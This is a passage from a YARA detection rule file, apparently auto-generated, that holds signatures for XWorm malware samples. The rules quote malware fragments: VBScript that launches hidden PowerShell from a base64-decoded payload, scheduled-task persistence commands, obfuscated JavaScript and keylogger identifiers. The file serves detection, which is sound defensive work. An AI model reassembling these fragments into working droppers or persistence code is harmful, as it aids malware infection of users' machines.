      $s13 = "1n98ZxUA10izSuSZTtT2EIE7jX7YJDUk4eYEI6AmsE24hpO9L3ER88vnXz09eyWs5HbPtmpWLGLYtE8FJSRyyoYPWhECOshhpplkHtO4kcxvhWl/ya7uo2uxqAh03Gyg" ascii /* score: '19.00'*/
      $s14 = "%JMDJWRY%s%JMDJWRY%%JMDJWRY%e%JMDJWRY%%JMDJWRY%t%JMDJWRY% ZCHBQS=C:\\Windows\\System32\\%BHJIXF:KBUFCAU=%" fullword ascii /* score: '18.00'*/
      $s15 = "ICAkYmVycnlNZW1NYW5hZ2VyOjpXcml0ZUJ5dGUoW0ludFB0cl06OkFkZCgkQmVycnlUYXJnZXRBZGRyZXNzLCAkc3RyYXdiZXJyeUkpLCAkYmVycnlGaWxsQnl0ZSkg" ascii /* base64 encoded string  */ /* score: '17.00'*/
   condition:
      uint16(0) == 0x4b25 and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__36a68630 {
   meta:
      description = "_subset_batch - file XWorm(signature)_36a68630.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "36a68630ff734394213742f3d23891d37843d83d397c4fcedd786568f5a3b3f1"
   strings:
      $s1 = "execute(\"\" & hfgymwflfyvtbvqd & \".Run \"\"powershell.exe \" & tubquntrdowmpsbf & \"\"\", 0, false\")" fullword wide /* score: '21.00'*/
      $s2 = "execute( \"set \" & hfgymwflfyvtbvqd & \" = CreateObject(\"\"WScript.Shell\"\")\" )" fullword wide /* score: '17.00'*/
      $s3 = "TnOj = dnBWh.ExpandEnvironmentStrings(\"%TEMP%\")" fullword wide /* score: '15.00'*/
      $s4 = "GonLG = WScript.ScriptFullName" fullword wide /* score: '14.00'*/
      $s5 = "dnBWh.Run kxDKx , lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s6 = "dnBWh.Run JKmvD, lUato , TAiHD" fullword wide /* score: '13.00'*/
      $s7 = "Set dnBWh = CreateObject(\"WScript.Shell\")" fullword wide /* score: '12.00'*/
      $s8 = "tubquntrdowmpsbf = tubquntrdowmpsbf & \";$Yolopolhggobek = [system.Text.Encoding]::Unicode.GetString($IgvVM);\"" fullword wide /* score: '12.00'*/
      $s9 = "tubquntrdowmpsbf = tubquntrdowmpsbf & \";$Yolopolhggobek = ($Yolopolhggobek -replace '%fOyRe%', '\" & GonLG.replace(\"\\\",\"$\"" wide /* score: '12.00'*/
      $s10 = "tubquntrdowmpsbf = tubquntrdowmpsbf & \";$IgvVM = [system.Convert]::FromBase64String( $MgOrq );\"" fullword wide /* score: '11.00'*/
      $s11 = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")" fullword wide /* score: '10.00'*/
      $s12 = "'e  sa relcp postcmecnmjoseent tt agu aoar" fullword wide /* score: '9.00'*/
      $s13 = "tubquntrdowmpsbf = tubquntrdowmpsbf & \";powershell $Yolopolhggobek;\"" fullword wide /* score: '9.00'*/
      $s14 = "kxDKx = \"scht\" & \"asks /del\" & \"ete /tn \" & Mojtb & \" /f\"" fullword wide /* score: '8.00'*/
      $s15 = "JKmvD = \"scht\" & \"asks /cr\" & \"eate /tn \" & Mojtb & \" /tr \"\"\" & mJbel & \"\"\" /sc min\" & \"ute /mo 1\"" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0xfeff and filesize < 10000KB and
      8 of them
}

rule XWorm_signature__5663a735 {
   meta:
      description = "_subset_batch - file XWorm(signature)_5663a735.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5663a73567202c494560a0de0da9c3f5e452e652e0233ca7c281a24ba12f3f5c"
   strings:
      $x1 = "')[_0x144042(0x85)]('');function unloadAllJS(){var _0x1d449e=_0x144042,_0x91a846=new Array();_0x91a846=document[_0x1d449e(0x94)]" ascii /* score: '36.00'*/
      $x2 = "')[_0x50e586(0x182)]('');function unloadAllJS(){var _0x434f30=_0x50e586,_0x4a87d8=new Array();_0x4a87d8=document[_0x434f30(0x19d" ascii /* score: '36.00'*/
      $x3 = "','15176rgHTFL','4400390GBgtVQ','5pBoJxW'];_0x2292=function(){return _0xa46a;};return _0x2292();}function YTUHRD(_0x20229c){var " ascii /* score: '36.00'*/
      $s4 = "/g,'');function unloadAllJS(){var _0x4abde7=_0x1d87aa,_0x53b589=new Array();_0x53b589=document[_0x4abde7(0x178)](_0x4abde7(0x177" ascii /* score: '30.00'*/
      $s5 = "(function(_0x9921b2,_0x31795c){var _0x28d85f=_0x2639,_0x138a27=_0x9921b2();while(!![]){try{var _0x5baa5f=parseInt(_0x28d85f(0x23" ascii /* score: '29.00'*/
      $s6 = ";_blog=_0x38b59c,_post=_0x2916cb;if(typeof document[_0x4371c6(0x1b4)]['host']!=_0x4371c6(0x1b8))var _0x5da2f6=document[_0x38467c" ascii /* score: '19.00'*/
      $s7 = "x3c8b90){var _0x3064af=_0x2639;_blog=_0x11950a,_post=_0x3c8b90;if(typeof document[_0x3064af(0x22c)]['host']!='BAD')var _0x13eb18" ascii /* score: '19.00'*/
      $s8 = "',_0x29a9ab(0x247),_0x29a9ab(0x251),_0x29a9ab(0x212),_0x29a9ab(0x257),_0x29a9ab(0x219),_0x29a9ab(0x222),_0x29a9ab(0x236)];return" ascii /* score: '18.00'*/
      $s9 = "')[_0x2c7458(0x19c)]('');function unloadAllJS(){var _0x2a1cb8=_0x2c7458,_0x283fb9=new Array();_0x283fb9=document[_0x2a1cb8(0x192" ascii /* score: '18.00'*/
      $s10 = "#*^%%$$ %!!!~?#*%*?%$%?*~** #%~!!~% ~!&$&~*%%!~& *??*?*^*%^^#$~ && #*^&%e%! !$%^!%!^&*^&%*? ~$~~~??!% #~ ??!&&#!%?~# %#&?$!^~##*" ascii /* score: '17.00'*/
      $s11 = "e5(0x272)?_post:0x0,_0x3358ea=new Image(0x1,0x1);_0x3358ea[_0x6161e5(0x248)]=_0x28045a+'//BAD.TXT/c.gif?s=2&b='+_0x825ad2+_0x616" ascii /* score: '16.00'*/
      $s12 = "')[_0x50e586(0x182)]('');function unloadAllJS(){var _0x2b4340=_0x50e586,_0x1bc68b=new Array();_0x1bc68b=document[_0x2b4340(0x19d" ascii /* score: '16.00'*/
      $s13 = "')[_0x50e586(0x182)]('');function unloadAllJS(){var _0x2f1f1c=_0x50e586,_0x410045=new Array();_0x410045=document[_0x2f1f1c(0x19d" ascii /* score: '16.00'*/
      $s14 = "ries\\x5c',_0x531d8a(0x232),_0x531d8a(0x234),_0x531d8a(0x21d),_0x531d8a(0x273),_0x531d8a(0x24a),_0x531d8a(0x255),_0x531d8a(0x244" ascii /* score: '16.00'*/
      $s15 = "yne=\\x27',_0x23c0fa(0x1f1),_0x23c0fa(0x279),_0x23c0fa(0x1f0),_0x23c0fa(0x269),_0x23c0fa(0x248),_0x23c0fa(0x1e7),'11xsvZWK',_0x2" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 8000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__82f320b2 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_82f320b2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "82f320b21342c883ecfdca917e16e98c0ddbfbf118f54b817aa9bfa20ed29e12"
   strings:
      $s1 = "XWormClient.exe" fullword wide /* score: '22.00'*/
      $s2 = "UopgrUnAgd5C4W2YPinMjGgiXTZSbROHRR7rjz714IbwuVQPIG75v3nRGoUVusG9ZrilogW6r27v2vu" fullword ascii /* score: '12.00'*/
      $s3 = "w5yjcunHZrbw8Z9G4mCNT9ilP12CVktq6uTAC5UpBuPzZJfLBsEZ6LreVIlgiifq7hJTX614CsyXu0sWZ3ot8PwxxSRDExDCV" fullword ascii /* score: '9.00'*/
      $s4 = "GAWkHzPkcttmq2S9TMmJ0S68JTTEa8NGEtwTEgPRyokqPXn7nZOnXr2vI1XAeXsjUV8e4QTsjnQ0JWIYKNs5" fullword ascii /* score: '9.00'*/
      $s5 = "nOew2MkwOoIjTipV0Uv1fYdQdX6CML6NUCNzPN28QNjEUABvYSMd6Cg1akDLwAYWFpJyheAdUDiJizj" fullword ascii /* score: '9.00'*/
      $s6 = "fCe5ryUXFLogr4FGghxkALzEcHAyiIn2koDazSqBNnILHbxUu3Pj" fullword ascii /* score: '9.00'*/
      $s7 = "IfDR0dzNcQc9kmfiAo8m0JEYe9WbtJPTJ8dsD0hAyadVLwoxbnZu9c74WyYgv142ZjnkhkyT2UmxK25" fullword ascii /* score: '9.00'*/
      $s8 = "qIjFTpz61xxgeMeVHhPfVYttj7KGud0SSQYRs7Uexbaa1dtB6MCj" fullword ascii /* score: '9.00'*/
      $s9 = "MP6Vf3kmkL0XcbEfEDnJZ7VbXeHR4f0sMK2reRx0XQv2xedSXeQaxCb2M8m9rqCoRG5egHOsTdb1JqM" fullword wide /* score: '9.00'*/
      $s10 = "VM2HyBXO0j5sNNpmu1DLz4LxG9EX0ajLqmzPFiGzLVttriLOgPeW2STRmkC3WjZGZ6XTj0C9wkBt2BdedqNh1EZWcINIKXAFx" fullword wide /* score: '9.00'*/
      $s11 = "intpreclp" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule XWorm_signature__9bdf77db {
   meta:
      description = "_subset_batch - file XWorm(signature)_9bdf77db.rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9bdf77dbcdd9d704c84b2e8c9072f4d4fb0a0d4e5bf733a6a9d0a1e5783540fc"
   strings:
      $s1 = "Shipping Doc.vbs" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3KB and
      all of them
}

rule XWorm_signature__f213d343 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f213d343.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f213d343dff4d0b5156f51e8f0d1fc771c9abadff53683e5c608dbb8a570f476"
   strings:
      $s1 = "Execute(Chr(((Sqr(((((((2184 / 4) / (56 / 8)) + ((424 - 9) / (15 - 10))) / Sqr((Sqr(3364) - (4 + 5)))) + ((((1295 - 8) / Sqr(9))" ascii /* score: '26.00'*/
      $s2 = "Execute(Chr(((Sqr(((((((2184 / 4) / (56 / 8)) + ((424 - 9) / (15 - 10))) / Sqr((Sqr(3364) - (4 + 5)))) + ((((1295 - 8) / Sqr(9))" ascii /* score: '26.00'*/
      $s3 = " + (75656 / 8))))) - (((((37 - 5) / (8 / 2)) / ((8 + 3) - (36 / 4))) - (((4 - 3) + (26 - 3)) / ((7 + 4) - (9 - 6)))) + ((((768 /" ascii /* score: '17.00'*/ /* hex encoded string 'ueh7X(3dC&7Igh' */
      $s4 = "(((846 - 6) / (45 / 9)) - Sqr((70 - 6))) / ((Sqr(169) - Sqr(9)) - ((24 / 8) + Sqr(25)))) / Sqr((Sqr((971 - 10)) - ((16 / 4) + Sq" ascii /* score: '9.00'*/
      $s5 = " - (17 - 9)) / Sqr((4 + 12)))) / ((((54 / 9) + (12 - 7)) - Sqr((86 + 14))) + Sqr(((10 + 5) - Sqr(36))))))) + Sqr(((((((132 / 6) " ascii /* score: '9.00'*/
      $s6 = "qr(((Sqr(((((45412 + 100604) / Sqr(4)) / ((6 - 5) + Sqr(9))) / Sqr((Sqr(324) - (14 - 5))))) / (((((4 + 124) / (3 + 5)) - ((12 + " ascii /* score: '9.00'*/
      $s7 = "947 - 8) - (1 + 2))) - (((5 + 28) / (10 - 7)) - (Sqr(100) - Sqr(49)))))) / ((Sqr((((33516 / 9) / (14 - 7)) - ((2 + 7) - (11 - 5)" ascii /* score: '9.00'*/
      $s8 = "(22 - 7) / (35 / 7)))))) / (Sqr(((Sqr((1800 / 2)) + ((304 - 6) + (1240 / 5))) / (Sqr(Sqr(81)) + ((8 / 2) - Sqr(9))))) / Sqr((Sqr" ascii /* score: '9.00'*/
      $s9 = ")))) / (((((133 - 7) / (15 - 6)) + ((189 / 9) / (10 - 7))) - (((54 / 6) - (48 / 6)) + ((12 / 6) + Sqr(16)))) - ((((1428 / 7) / S" ascii /* score: '9.00'*/
      $s10 = "+ 241) / (4 / 2)) / (Sqr(36) + (27 / 9))) / (((6 - 5) + (6 - 4)) + ((18 - 8) / (14 - 9))))) / Sqr(((((16 - 7) - (2 + 5)) + ((72 " ascii /* score: '9.00'*/
      $s11 = "Sqr(81225) - Sqr(16))) / ((Sqr(25600) / (10 - 6)) / ((9 - 8) + (63 / 9)))) / (((Sqr(625) - (18 / 2)) - Sqr(Sqr(256))) - (Sqr((54" ascii /* score: '9.00'*/
      $s12 = " 732))))) - (((((25 - 10) + (65 - 3)) / Sqr((98 / 2))) - Sqr(((113 - 3) - (90 / 9)))) + ((((126 / 9) - (2 + 1)) + Sqr((50 / 2)))" ascii /* score: '9.00'*/
      $s13 = "- 5) - (9 - 6)) / (Sqr(576) / (1 + 3)))) - (Sqr(((6396 / 6) + (531 + 428))) / ((Sqr(1024) - (35 / 5)) / ((135 / 9) / (1 + 2)))))" ascii /* score: '9.00'*/
      $s14 = "Sqr(((1029 / 3) / (12 - 5)))) + ((((1280 / 4) / (48 / 6)) / (Sqr(49) + (11 - 10))) - (Sqr(Sqr(4096)) - Sqr((2 + 23))))))) + ((((" ascii /* score: '9.00'*/
      $s15 = "((146 - 8) / (10 - 8)) + ((7 + 2) + (10 + 3))) + (Sqr((3143 - 7)) - ((6 + 15) / (9 / 3))))) + (((((24258 / 6) - (3 + 6)) + ((182" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7845 and filesize < 5000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__35c7a608 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_35c7a608.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "35c7a608d25abb18c35c0e576da5afa90f378c67870657aa32e58aa452923d67"
   strings:
      $s1 = "%Public%" fullword wide /* PEStudio Blacklist: folder */ /* score: '16.00'*/
      $s2 = "62G1UTMuPsjXViW3eye27iZd50V9pqm8dViwLwUzyXkPfGthsgxNhDLL7oRSzg6J5kk5ULviPEzNN2QCkJGhMdyrel5GOO" fullword ascii /* score: '14.00'*/
      $s3 = "K7YwnskEYeRYsHktMrBk9zXaDmt4yrsNxFxZFlfIBoWxXPxrerLesn" fullword wide /* score: '12.00'*/
      $s4 = "1JsKjah9zc0iXDo64ZGtUzreA3Ge3pVddecfX5nNmL0YkGzzkDYgeT" fullword ascii /* score: '9.00'*/
      $s5 = "MRxt6hTPhbh3OJ63zg4XNey3FoxO71eyEUvznHn7IpqK0mvM5MTP2BTH3RNxq" fullword ascii /* score: '9.00'*/
      $s6 = "NhwqFRMrWdeBNWrfyrfO7vZ1JwudLbeh7GP9iXgjGETDJA1fS7s60RiVnSRJ9s1UOe3EAmBMnilGEWE" fullword ascii /* score: '9.00'*/
      $s7 = "ftgAX0zPp5WOxjFK1i0zoUT6mQBgKkfOXEiBBn05Jt8PALVkFMvz32GN6AaPM3r6t12xa3EMgh4xsALileD8nkIrcXbqa9" fullword ascii /* score: '9.00'*/
      $s8 = "rXLRRtq5Kl6wi8FKBAFLiHMC5EeQVbW0CYwEqx836BE7deLoGjQWou3zJ39sXaRfkDsBoVksWoeuxYx" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__58b09f78 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_58b09f78.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "58b09f78ed25e76e2c9e5abf0e10af50a63e2c5e480ae3ed160569b7baa28b42"
   strings:
      $s1 = "file xworm.exe" fullword wide /* score: '19.00'*/
      $s2 = "WHKEYBOARDLL" fullword ascii /* score: '14.50'*/
      $s3 = "XLogger" fullword ascii /* score: '14.00'*/
      $s4 = "LoggerPath" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__6aec274b {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_6aec274b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6aec274be9554ffe0676af41069f7f52a9af50ac7291de722203930aeca8a536"
   strings:
      $s1 = "WHKEYBOARDLL" fullword ascii /* score: '14.50'*/
      $s2 = "XLogger" fullword ascii /* score: '14.00'*/
      $s3 = "LoggerPath" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__8727308a {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_8727308a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8727308a32fe5bc544074066b76ff9ffd8b47d49c387bf23a471f51c068c7f58"
   strings:
      $s1 = "WHKEYBOARDLL" fullword ascii /* score: '14.50'*/
      $s2 = "XLogger" fullword ascii /* score: '14.00'*/
      $s3 = "LoggerPath" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c434a0f3 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c434a0f3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c434a0f3a771bf9bec45d96f45dd26dbd3a49eb5c9021e0a07d329f62ff2ac1e"
   strings:
      $s1 = "patc.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 90KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__af39eba3 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_af39eba3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "af39eba3714630ae15f3a3ee2b46607b355f35d3ca5ef5f7441d699384c0f791"
   strings:
      $s1 = "123.exe" fullword wide /* score: '19.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__0cdbc879 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_0cdbc879.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0cdbc8796b5a5adba8b361c2b13626b03c4b25975244bec36b6acf0dcde65352"
   strings:
      $s1 = "XWormClient.exe" fullword wide /* score: '22.00'*/
      $s2 = "EzJ1zdKYUb1UGCSDv+EI0LUkR3QhTOuwB/nl2XmbGKbIwlduoGfiU/MEbqWMoZ7ECqVir2XQRH7biUairhbaWcBZETqwmbj7ysUxP9B6proxdr3pjbh/RZNhd5hkXF8X" wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__45ba32fc {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_45ba32fc.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "45ba32fcb65201e7cae3d05f77178e08fd41380624edd777e355c63ac1d126b7"
   strings:
      $s1 = "XWormClient.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5690563f {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5690563f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5690563f352546c1b818db1cd50746466ace06de9b6a3b4abc313878de8da365"
   strings:
      $s1 = "XWormClient.exe" fullword wide /* score: '22.00'*/
      $s2 = "CriticalProcesses_Disable" fullword ascii /* score: '11.00'*/
      $s3 = "ProcessCritical" fullword ascii /* score: '11.00'*/
      $s4 = "SetCurrentProcessIsCritical" fullword ascii /* score: '11.00'*/
      $s5 = "CriticalProcess_Enable" fullword ascii /* score: '11.00'*/
      $s6 = "SystemEvents_SessionEnding" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__b641d47c {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b641d47c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b641d47cd7188049c6a4cc259919d95d84205f4d4e6b32d5580b1c462a87cf30"
   strings:
      $s1 = "XWormClient.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__bf84c762 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bf84c762.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bf84c762ee3e631f60e38c4aab721e726d1b7e03d759f581d4879bc5110693f6"
   strings:
      $s1 = "bbbbbb.exe" fullword wide /* score: '22.00'*/
      $s2 = "bWmSsSc7bdd7dxWMvaSpYSuv8XIpPkANkhT7MpdkMmuTlQSRoc6dDo0MiMk" fullword ascii /* score: '9.00'*/
      $s3 = "xQXvqb4BkJ7KeOHsWfsqg6MJt5TBYydXnshlEKdARX63YSX6Lym7ZzoXdjovsyZaiPTL8vFhIrccr2fSSW" fullword ascii /* score: '9.00'*/
      $s4 = "jwy7og5kEGfMveyewNHn5il3yOOmUnG3llKUDOG2N47B8zeH6dZ5BCDdrxmiRmHtkgUR1RaeNe71DBeKLw" fullword ascii /* score: '9.00'*/
      $s5 = "mHuFw5jMr5XnRqAVOYoEtgETElNgkmFZg9Gw0n7uLjr4L8KT0B37nPhxYbd" fullword ascii /* score: '9.00'*/
      $s6 = "k1tlDCSJA16x5JebvvQLdLlU" fullword ascii /* score: '9.00'*/
      $s7 = "E04tqgeOuVKpQUcLUqebwn16nuLxjZVpDTmoiNh2tKt2p63xeatgeTOGc47PHNHZdGncUXNbnGFnSeNBqNSpgmrwOyEwzktXiKU" fullword ascii /* score: '9.00'*/
      $s8 = "SSKDpMkdlLRBut6BnH3rIVMk" fullword ascii /* score: '9.00'*/
      $s9 = "KFWAleMbOsv28kBmORCWGetD43mJ29DgDVxr8Bqpo4IUea9n4jOGhy4m2xVw82DtZEy0TLFWn8WRuKBS1M" fullword ascii /* score: '9.00'*/
      $s10 = "vbvOMixBhBZuBo3o01F097s5h8TACTrYdg45st3fWDG2d00KZBQ109dwFH816KvJ7kCxAvtch3iFTPi5eI" fullword ascii /* score: '9.00'*/
      $s11 = "3qnkJjT9IN3atQnlXb40grCMrOmX3aiK93jCUnj61Yf9HgpcriiRCWj4RIliM8FiV3O6pQYDpRIiLBJb2M" fullword ascii /* score: '9.00'*/
      $s12 = "TZCksefHD0sYHSBM3jhFhfHGnNiXDmRHe53X16pPGeTJrktUQbToJY8bIJuofQy7Xe4XEz8ZxA" fullword wide /* score: '9.00'*/
      $s13 = "pHwLbn8ASfVhpq9kqtVM2hNDLlHpJ1aUtuqSg4Ok027oO6jQbMlBrYyLo0c" fullword wide /* score: '9.00'*/
      $s14 = "LTYHzzMS47kVkQJKAkqocvUDcVkue6HKk4hYUCxCtCR8RnctLw24kFvl136Znp21vy2mKQxeHcR0iYn8hu" fullword ascii /* score: '8.00'*/
      $s15 = "PLWUTZg774HfEuNXbfrXVYfUZcY9shsJx2arjyDhL7inEIi8nIKMtl9kATzGk4DUkeMFlLD5FX" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__104da4a6 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_104da4a6.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "104da4a6a9f13d9b3c36e71838fbe5adf66dbaa68f2ae4b4a7067c9511ca3cac"
   strings:
      $s1 = "x31agosto.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a467b279 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a467b279.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a467b27938a326b5e8e3a06faffec85324e5d94afcfb1be03715becd36eeb8fd"
   strings:
      $s1 = "CleanerV2.exe" fullword wide /* score: '22.00'*/
      $s2 = "sLOgosb23w4sxmbPNqRL8l" fullword ascii /* score: '9.00'*/
      $s3 = "p94LCqZ5naQQ3j7j1iNjpFUQObkDrGcRp0cZCqm7Cp9HfqhuRZaedJ" fullword ascii /* score: '9.00'*/
      $s4 = "NKDhhefPyJstx9RaUCxq2hhZKBOLDasPYINOMyFJuLcMmvAS3vuKqx" fullword ascii /* score: '9.00'*/
      $s5 = "z5Gd9mx0Dr1linM4IIZC5qcMZzFrNht0qYV6y5drkRSpYoGhPdbUocPkvNq4UX3EijJ8k4akyXdsr7HxljeMqI" fullword ascii /* score: '9.00'*/
      $s6 = "SQvGklGJd97FnJFVkUEUALAfZ7Dh1f6Cu5hBceiKRTilJB5toNvms39ocpvuE4vDsg3gRgkGVYZqn3WFU9tjwZ" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__24190356 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_24190356.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "24190356e2aa14bfef15e1794dfe78fb40b6efc7c4cad88360c67221e7d20f90"
   strings:
      $s1 = "InVHivq3XE645N39ugxBkhQACvVNbpPuDOyBqaC7sJxfszdxgeQZjrwjRgetsmE96tcQy4scy5addXw" fullword ascii /* score: '9.00'*/
      $s2 = "ECwyBfTp0h0Zxsry3PwAEi2YzfW5Mz4vELTMod3qrjIzt3HK6gZunyoD6mjZ6sQ20DmrniUs2l7PBgw" fullword ascii /* score: '9.00'*/
      $s3 = "iylwagrNJS8JFspyR6OY1HTyTHcsuzPYha3Drp3M4bEnnsDsXLciQxZyE" fullword ascii /* score: '9.00'*/
      $s4 = "XYfMl9EseTYB7soHQpZs4PaXPYeFH4ZX1XrTQKurUtRHu3l6Qq3ugtKRaFu1q07Irc8HtjdUAwMyOUK" fullword ascii /* score: '9.00'*/
      $s5 = "I0ftPSPciVuGYQ0AUlRLVMCBC3EzYHnVQZErNNOXgMU5j6gnRdNu67Em1" fullword ascii /* score: '9.00'*/
      $s6 = "LOG2TiORfouTtSrm3LckxlEwPwAKW7gFus7vdUIpVEgKrMNUhn5QqEWA43EkqIOVZpDoRVUI2IE4abu" fullword ascii /* score: '9.00'*/
      $s7 = "7f3vXNv5xwxgluG8L8jsdU8Kr2QT0mfaK1Eszx34SAMmZ42twTLjsuJ5C" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5b02bf5e {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5b02bf5e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "5b02bf5ea457bb4d01c5f5778aee826a7d8a00fbfa09d8412cad5d960438377d"
   strings:
      $s1 = "XWormClient2.exe" fullword wide /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__68b0c0b2 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_68b0c0b2.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "68b0c0b2c9b2b3dfe82ac8cf891735ec45702b9797457cbf9ec516fe7333a6ad"
   strings:
      $s1 = "nursultan.exe" fullword wide /* score: '22.00'*/
      $s2 = "TeaNjgt1sEcWFJgmpkRQbsCyXDJ4YyMGiF8xdAopIsjrf3u0NOwB7O7erJEu57P52ntPWIPv2pGmhfSPYRDIupo" fullword ascii /* score: '9.00'*/
      $s3 = "GxJDGT0jFKTWHk78332yoEIha6A5usBmbVxlD4hLfumsirCMWaLHXULaHiTYxZusEsWPAAAld6VjzsQ0VWyUmcD" fullword ascii /* score: '9.00'*/
